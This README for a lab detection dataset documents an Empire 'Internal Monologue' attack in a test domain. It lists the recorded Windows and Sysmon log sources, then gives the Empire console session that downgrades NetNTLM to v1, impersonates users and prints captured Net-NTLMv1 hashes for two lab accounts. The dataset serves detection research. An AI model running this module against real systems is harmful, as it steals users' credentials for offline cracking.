# Empire Extended NetNTLM Downgrade

Adversary can downgrade the challenge/response authentication protocol used for network logons, the minimum security negotiated for applications using NTLMSSP, and security settings that restrict outgoing NTLM traffic to remote servers in my environment

## Technique(s) ID

T1003

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_extended_ntlm_downgrade.tar.gz](./empire_extended_ntlm_downgrade.tar.gz)

## Network Environment

Shire

## Time Taken

2019-12-25045202

## About this file

| log_name                                 | source_name                         | task                          |   record_number |
|------------------------------------------|-------------------------------------|-------------------------------|-----------------|
| security                                 | Microsoft-Windows-Security-Auditing | Registry                      |              84 |
| security                                 | Microsoft-Windows-Security-Auditing | Filtering Platform Connection |              68 |
| security                                 | Microsoft-Windows-Security-Auditing | Handle Manipulation           |              24 |
| security                                 | Microsoft-Windows-Security-Auditing | Process Creation              |               1 |
| security                                 | Microsoft-Windows-Security-Auditing | Process Termination           |               1 |
| security                                 | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use       |               1 |
| Windows PowerShell                       | PowerShell                          | Pipeline Execution Details    |             149 |
| Security                                 | Microsoft-Windows-Security-Auditing | Filtering Platform Connection |              73 |
| Security                                 | Microsoft-Windows-Security-Auditing | Logoff                        |               5 |
| Security                                 | Microsoft-Windows-Security-Auditing | Group Membership              |               4 |
| Security                                 | Microsoft-Windows-Security-Auditing | Logon                         |               4 |
| Security                                 | Microsoft-Windows-Security-Auditing | Special Logon                 |               4 |
| Security                                 | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use       |               3 |
| Security                                 | Microsoft-Windows-Security-Auditing | Other Object Access Events    |               1 |
| Microsoft-Windows-Sysmon/Operational     | Microsoft-Windows-Sysmon            | na                            |            1090 |
| Microsoft-Windows-PowerShell/Operational | Microsoft-Windows-PowerShell        | Executing Pipeline            |             123 |

## Attacker Activity

```
(Empire: XFLEZM9N) > usemodule credentials/invoke_internal_monologue*
(Empire: powershell/credentials/invoke_internal_monologue) > info

              Name: Invoke-InternalMonologue
            Module: powershell/credentials/invoke_internal_monologue
        NeedsAdmin: True
         OpsecSafe: False
          Language: powershell
MinLanguageVersion: 2
        Background: False
   OutputExtension: None

Authors:
  @eladshamir
  @4lex

Description:
  Uses the Internal Monologue attack to force easily-
  decryptable Net-NTLMv1 responses over localhost and without
  directly touching LSASS.
  https://github.com/eladshamir/Internal-Monologue

Comments:
  The underlying powershell function accepts switches that
  [DISABLE] default behaviours. The default settings will
  downgrade NetNTLM responses to v1, impersonate all users,
  use challenge 1122334455667788 and restore the registry to
  its original state. Set the options in this module to True
  in order to DISABLE the behaviours Disabling Downgrade and
  Impersonation yields higher OPSEC, but less than ideal loot

Options:

  Name        Required    Value                     Description
  ----        --------    -------                   -----------
  Agent       True        XFLEZM9N                  Agent to use for InternalMonologue      
  Challenge   True        1122334455667788          Net-NTLM Challenge to send              
  Downgrade   False                                 DISABLE downgrading to allow Net-NTLMv1 
                                                    responses                               
  Impersonate False                                 DISABLE user impersonation and fetch    
                                                    only current user                       
  Restore     False                                 DISABLE restoring the registry setting  
                                                    that allowed v1 responses               
  Verbose     False                                 Verbose                                 

(Empire: powershell/credentials/invoke_internal_monologue) > execute
[>] Module is not opsec safe, run? [y/N] y
[*] Tasked XFLEZM9N to run TASK_CMD_WAIT
[*] Agent XFLEZM9N tasked with task ID 2
[*] Tasked agent XFLEZM9N to run module powershell/credentials/invoke_internal_monologue
(Empire: powershell/credentials/invoke_internal_monologue) > pgustavo::shire:6c5a5d82ec8bf7d84989d0876cdfe1b57a0019b72517ca9f:6c5a5d82ec8bf7d84989d0876cdfe1b57a0019b72517ca9f:1122334455667788
IT001$::shire:cf1dd7f62b7394958df43c8bbdff4888495a7e572a359017:cf1dd7f62b7394958df43c8bbdff4888495a7e572a359017:1122334455667788
```